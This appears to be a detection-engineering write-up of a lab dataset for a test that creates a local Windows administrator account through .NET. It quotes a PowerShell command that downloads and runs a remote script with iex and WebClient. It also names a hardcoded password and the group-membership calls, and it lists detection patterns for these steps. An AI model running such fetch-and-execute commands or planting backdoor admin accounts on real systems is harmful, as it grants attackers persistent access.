# T1136.001-9: Local Account — Create a new Windows admin user via .NET

## Technique Context

T1136.001 (Create Account: Local Account) is a persistence technique where adversaries create local user accounts to maintain access to systems. This particular test demonstrates creating a local administrator account using .NET libraries rather than the traditional `net user` commands, representing a more evasive approach. The technique is commonly used by attackers who have gained administrative privileges and want to establish a backdoor account for continued access. Detection engineers focus on monitoring account creation events, unusual PowerShell activity, and process lineage involving account management operations.

## What This Dataset Contains

This dataset captures a PowerShell-based local account creation that successfully executes the technique end-to-end. The attack chain begins with Security event 4688 showing PowerShell execution with command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}`. 

The PowerShell events (4104) capture the complete malicious script including the username "NewLocalUser", password "P@ssw0rd123456789!", and explicit references to creating an administrator account. Key PowerShell activities include loading `System.DirectoryServices.AccountManagement` assembly via `Add-Type`, creating a `PrincipalContext` for local machine context, instantiating `UserPrincipal` objects, setting user properties, and adding the user to the Administrators group.

Sysmon captures the network connection to GitHub (185.199.109.133:443) for script download, DNS resolution for `raw.githubusercontent.com`, and LDAP connections (192.168.4.10:389) for Active Directory operations. The technique includes validation via `net user NewLocalUser` command execution captured in both Security 4688 events and Sysmon process creation events. The script also performs cleanup by deleting the created user, with PowerShell logging showing "User 'NewLocalUser' deleted successfully."

Process lineage shows PowerShell (PID 19968) spawning child PowerShell (PID 20032) that downloads and executes the script, then spawns `net.exe` which in turn spawns `net1.exe` for user enumeration.

## What This Dataset Does Not Contain

This dataset lacks several important detection artifacts. There are no Security events for actual account management operations (4720 for account creation, 4732 for group membership changes) which would typically be the primary detection points. The absence of these events suggests either the account operations occurred too quickly to be captured in this time window, or there may be audit policy limitations. 

The dataset also contains no file creation events for the downloaded PowerShell script itself - only profile-related file operations are captured. Windows Defender appears active based on multiple DLL loads but there are no security product alerts or blocking events. The SAM database modifications that would accompany local account creation are not visible in the telemetry.

## Assessment

This dataset provides excellent coverage of the attack delivery mechanism and PowerShell execution phases, making it highly valuable for detection engineering focused on script-based account creation techniques. The PowerShell script block logging captures the complete attack payload with clear indicators including hardcoded credentials, .NET assembly loading patterns, and administrative group manipulation. The network telemetry effectively demonstrates the download-and-execute pattern common in real attacks.

However, the absence of core Windows account management audit events significantly limits detection opportunities focused on the actual persistence mechanism. The dataset is strongest for behavioral detections around PowerShell abuse and weakest for detecting the underlying Windows security events that indicate account creation.

## Detection Opportunities Present in This Data

1. **PowerShell script block analysis** - Detect `Add-Type -AssemblyName System.DirectoryServices.AccountManagement` indicating programmatic account management via .NET
2. **Hardcoded credential patterns** - Alert on PowerShell scripts containing password assignments with complex password patterns like "P@ssw0rd123456789!"
3. **Administrative group manipulation** - Monitor PowerShell invocations of `GroupPrincipal.Members.Add` operations targeting "Administrators" group
4. **Remote script execution via WebClient** - Detect `new-object net.webclient).downloadstring` patterns followed by `iex` for script execution
5. **Process lineage anomalies** - Alert on PowerShell spawning child PowerShell processes with external URL references in command lines
6. **Network connections from PowerShell** - Monitor PowerShell processes connecting to GitHub or other code repositories (185.199.109.133:443)
7. **Account validation commands** - Detect `net user` command execution with specific usernames immediately following PowerShell .NET assembly loading
8. **LDAP queries from non-domain processes** - Alert on PowerShell processes making LDAP connections (port 389) for account operations
